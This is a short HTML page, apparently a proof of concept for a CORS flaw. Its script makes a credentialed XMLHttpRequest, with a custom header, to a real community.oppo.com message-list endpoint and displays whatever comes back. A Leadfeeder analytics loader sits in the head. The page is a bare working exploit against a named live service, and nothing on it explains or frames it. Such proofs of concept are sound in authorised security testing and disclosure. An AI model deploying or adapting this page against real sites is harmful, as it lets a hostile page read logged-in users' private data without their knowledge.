<!DOCTYPE html>
<html>
<head>
    <title>XHR CORS Test</title>
    <script> (function(ss,ex){ window.ldfdr=window.ldfdr||function(){(ldfdr._q=ldfdr._q||[]).push([].slice.call(arguments));}; (function(d,s){ fs=d.getElementsByTagName(s)[0]; function ce(src){ var cs=d.createElement(s); cs.src=src; cs.async=1; fs.parentNode.insertBefore(cs,fs); }; ce('https://sc.lfeeder.com/lftracker_v1_'+ss+(ex?'_'+ex:'')+'.js'); })(document,'script'); })('ywVkO4Xeoz1aZ6Bj'); </script>
</head>
<body>
    <h3>Testing CORS with XHR</h3>
    <script>
        const url = "https://community.oppo.com/ajax/msg/frontend/system/index/list?page=1&limit=10";

        // Test with XHR
        const xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.withCredentials = true;

        // Set the custom header
        xhr.setRequestHeader("appCode", "community");

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    console.log("Response:", xhr.responseText);
                    alert("Data fetched: " + xhr.responseText);
                } else {
                    console.error("Request failed with status:", xhr.status);
                }
            }
        };

        xhr.send();
    </script>
</body>
</html>
